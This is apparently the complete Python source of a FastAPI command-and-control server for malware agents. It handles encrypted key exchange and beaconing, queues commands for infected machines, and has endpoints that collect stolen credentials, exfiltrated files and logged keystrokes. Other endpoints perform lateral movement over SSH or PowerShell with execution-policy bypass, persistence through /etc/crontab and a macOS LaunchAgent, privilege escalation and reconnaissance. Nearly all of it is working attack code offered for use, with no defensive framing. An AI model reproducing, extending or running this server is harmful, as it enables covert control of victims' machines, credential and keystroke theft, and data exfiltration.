######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

from fastapi import FastAPI, HTTPException, Query
from pydantic import BaseModel
from typing import Dict, List
import logging
import base64
import gzip
import shutil
from io import BytesIO
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
import uvicorn
import os
import paramiko

app = FastAPI()
agents: Dict[str, Dict] = {}

# Logging configuration
logging.basicConfig(filename="c2_server.log", level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')

class CheckinRequest(BaseModel):
    AgentID: str

class ResultRequest(BaseModel):
    AgentID: str
    Result: str

class CommandRequest(BaseModel):
    AgentID: str
    Command: str

class KeyExchangeRequest(BaseModel):
    AgentID: str
    EncAESKey: str

class BeaconRequest(BaseModel):
    AgentID: str

class SystemInfoRequest(BaseModel):
    agent_id: str
    system_info: str

class CredentialsRequest(BaseModel):
    data: List[str]

class ExfiltrateRequest(BaseModel):
    file: str

class KeystrokesRequest(BaseModel):
    keystrokes: str

class LateralMovementRequest(BaseModel):
    target_ip: str
    username: str
    password: str

# Load RSA Public Key
try:
    with open("public_key.xml", "r") as xml_file:
        PUBLIC_KEY_XML = xml_file.read()
except FileNotFoundError:
    logging.error("public_key.xml not found!")
    PUBLIC_KEY_XML = ""

@app.get("/public_key")
def get_public_key():
    if not PUBLIC_KEY_XML:
        raise HTTPException(status_code=500, detail="Public key not found")
    
    logging.info("Public key requested")
    return {"PublicKey": PUBLIC_KEY_XML}

def check_key_length(key: bytes) -> bytes:
    if len(key) != 32:
        raise ValueError(f"Incorrect AES key length ({len(key)} bytes). Expected 32 bytes.")
    return key

def encrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    cipher = AES.new(key, AES.MODE_GCM)
    nonce = cipher.nonce
    cipher_text, tag = cipher.encrypt_and_digest(data.encode())
    encrypted_data = base64.b64encode(nonce + cipher_text + tag).decode('utf-8')
    return encrypted_data

def decrypt_data(data: str, key: bytes) -> str:
    key = check_key_length(key)
    try:
        raw_data = base64.b64decode(data)
        nonce = raw_data[:12]
        cipher_text = raw_data[12:-16]
        tag = raw_data[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_text = cipher.decrypt_and_verify(cipher_text, tag)
        return decrypted_text.decode('utf-8')
    except Exception as e:
        logging.error(f"Decryption failed: {str(e)}")
        raise HTTPException(status_code=400, detail="Decryption failed")

def load_private_key():
    with open("private_key.pem", "rb") as f:
        private_key = RSA.import_key(f.read())
    return private_key

def decrypt_aes_key(enc_aes_key_base64, private_key):
    enc_aes_key = base64.b64decode(enc_aes_key_base64)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    aes_key = cipher_rsa.decrypt(enc_aes_key)
    return aes_key

private_key = load_private_key()

@app.post("/exchange_key")
def exchange_key(request: KeyExchangeRequest):
    agent_id = request.AgentID
    enc_aes_key = request.EncAESKey
    try:
        aes_key = decrypt_aes_key(enc_aes_key, private_key)
        if len(aes_key) != 32:
            raise ValueError("Invalid AES key length after decryption!")

        agents[agent_id] = {"aes_key": aes_key, "commands": [], "results": []}
        logging.info(f"Key exchange successful for AgentID: {agent_id}")
        return {"Status": "Success"}
    except Exception as e:
        logging.error(f"Key exchange failed for AgentID {agent_id}: {str(e)}")
        raise HTTPException(status_code=400, detail="Key exchange failed")

@app.post("/beacon")
def beacon(request: BeaconRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    aes_key = agents[agent_id]["aes_key"]
    
    if agents[agent_id]["commands"]:
        command = agents[agent_id]["commands"].pop(0)
        response = encrypt_data(command, aes_key)
        logging.info(f"Sent command '{command}' to agent {agent_id}")
    else:
        response = encrypt_data("NoCommand", aes_key)
        logging.info(f"No commands for agent {agent_id}")

    return {"data": response}

@app.post("/checkin")
def checkin(request: CheckinRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        agents[agent_id] = {"aes_key": None, "commands": [], "results": []}
        logging.info(f"Agent {agent_id} checked in.")
        return {"Status": "Agent registered"}
    else:
        logging.info(f"Agent {agent_id} already registered.")
        return {"Status": "Agent already registered"}

@app.post("/result")
def result(request: ResultRequest):
    agent_id = request.AgentID
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")

    try:
        decrypted_result = decrypt_data(request.Result, agents[agent_id]["aes_key"])
        agents[agent_id]["results"].append(decrypted_result)

        message = f"Agent {agent_id} executed command with result: {decrypted_result}"
        logging.info(message)
        print(message, flush=True)  # Print for real-time monitoring
    except Exception as e:
        logging.error(f"Failed to process result from agent {agent_id}: {str(e)}")
        raise HTTPException(status_code=400, detail="Decryption failed")

    return {"Status": "OK"}

@app.post("/receive_credentials")
def receive_credentials(request: CredentialsRequest):
    data = request.data
    logging.info(f"Received credentials: {data}")
    print(f"Received credentials: {data}", flush=True)  # Print for real-time monitoring
    return {"Status": "OK"}

@app.post("/exfiltrate")
def exfiltrate(request: ExfiltrateRequest):
    file_data = base64.b64decode(request.file)
    decompressed_file_data = gzip.decompress(file_data)

    save_path = "received_file.gz"
    with open(save_path, 'wb') as f:
        f.write(decompressed_file_data)

    logging.info(f"Received exfiltrated file and saved to {save_path}")
    print(f"Received exfiltrated file and saved to {save_path}", flush=True)  # Print for real-time monitoring
    return {"Status": "OK"}

@app.post("/receive_keystrokes")
def receive_keystrokes(request: KeystrokesRequest):
    keystrokes = request.keystrokes
    logging.info(f"Received keystrokes: {keystrokes}")
    print(f"Received keystrokes: {keystrokes}", flush=True)  # Print for real-time monitoring
    return {"Status": "OK"}

@app.post("/move_laterally")
def move_laterally(request: LateralMovementRequest):
    target_ip = request.target_ip
    username = request.username
    password = request.password
    result = None
    try:
        if os.name == 'nt':
            script_path = os.path.join(os.path.dirname(__file__), 'windows', 'lateral_movement.ps1')
            result = os.system(f"powershell -ExecutionPolicy Bypass -File {script_path} {target_ip} {username} {password}")
        elif os.name == 'posix':
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=username, password=password)
            stdin, stdout, stderr = client.exec_command("hostname")
            result = stdout.read().decode()
            client.close()
    except Exception as e:
        logging.error(f"Error in lateral movement: {str(e)}")
        raise HTTPException(status_code=400, detail=f"Error in lateral movement: {str(e)}")
    
    logging.info(f"Lateral movement to {target_ip} executed. Result: {result}")
    return {"Status": "OK", "Result": result}

@app.post("/establish_persistence")
def establish_persistence():
    result = None
    try:
        if os.name == 'nt':
            script_path = os.path.join(os.path.dirname(__file__), 'windows', 'persistence.ps1')
            result = os.system(f"powershell -ExecutionPolicy Bypass -File {script_path}")
        elif os.name == 'posix':
            cron_job = "@reboot /path/to/your/agent.sh"
            with open("/etc/crontab", "a") as cron_file:
                cron_file.write(cron_job + "\n")
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.macos.agent.plist")
            with open(plist_path, 'w') as plist_file:
                plist_file.write(f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.macos.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>/path/to/your/agent.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")
            os.system(f"launchctl load -w {plist_path}")
    except Exception as e:
        logging.error(f"Error in establishing persistence: {str(e)}")
        raise HTTPException(status_code=400, detail=f"Error in establishing persistence: {str(e)}")

    logging.info("Persistence mechanism established.")
    return {"Status": "OK"}

@app.post("/escalate_privileges")
def escalate_privileges():
    result = None
    try:
        if os.name == 'nt':
            script_path = os.path.join(os.path.dirname(__file__), 'windows', 'privilege_escalation.ps1')
            result = os.system(f"powershell -ExecutionPolicy Bypass -File {script_path}")
        elif os.name == 'posix':
            command = "sudo -n true && echo 'Sudo access granted' || echo 'Sudo access denied'"
            result = os.system(command)
    except Exception as e:
        logging.error(f"Error in escalating privileges: {str(e)}")
        raise HTTPException(status_code=400, detail=f"Error in escalating privileges: {str(e)}")

    logging.info("Privilege escalation attempted.")
    return {"Status": "OK", "Result": result}

@app.post("/gather_system_info")
def gather_system_info():
    system_info = {}
    try:
        if os.name == 'nt':
            script_path = os.path.join(os.path.dirname(__file__), 'windows', 'reconnaissance.ps1')
            result = os.popen(f"powershell -ExecutionPolicy Bypass -File {script_path}").read()
            system_info["system_info"] = result
        elif os.name == 'posix':
            command = "uname -a && lsb_release -a && df -h && free -m"
            result = os.popen(command).read()
            system_info["system_info"] = result
    except Exception as e:
        logging.error(f"Error in gathering system info: {str(e)}")
        raise HTTPException(status_code=400, detail=f"Error in gathering system info: {str(e)}")

    logging.info("System information gathered.")
    return {"Status": "OK", "SystemInfo": system_info}

@app.post("/sendcommand")
def send_command(request: CommandRequest):
    agent_id = request.AgentID
    command = request.Command
    if agent_id in agents:
        agents[agent_id]["commands"].append(command)
        logging.info(f"Command received from CLI: {command}")
        logging.info(f"Command sent to agent {agent_id}: {command}")
        return {"Status": "Command sent"}
    logging.error(f"Agent not found: {agent_id}")
    raise HTTPException(status_code=404, detail="Agent not found")

@app.get("/agents")
def list_agents():
    active_agents = [agent for agent, data in agents.items() if data.get("aes_key") is not None]  # Only list online agents
    logging.info(f"Listing agents: {active_agents}")
    return {"agents": [{"AgentID": agent} for agent in active_agents]}
    

@app.get("/result")
def get_result(agent_id: str = Query(..., alias="agent_id")):
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")

    if agents[agent_id]["results"]:
        result = agents[agent_id]["results"].pop(0)
        logging.info(f"Fetched result for agent {agent_id}: {result}")
        return {"Result": result}
    else:
        logging.info(f"No results available for agent {agent_id}")
        return {"Result": "No result available"}

def run_server():
    uvicorn.run(app, host="0.0.0.0", port=8080, log_level="debug")

if __name__ == "__main__":
    run_server()
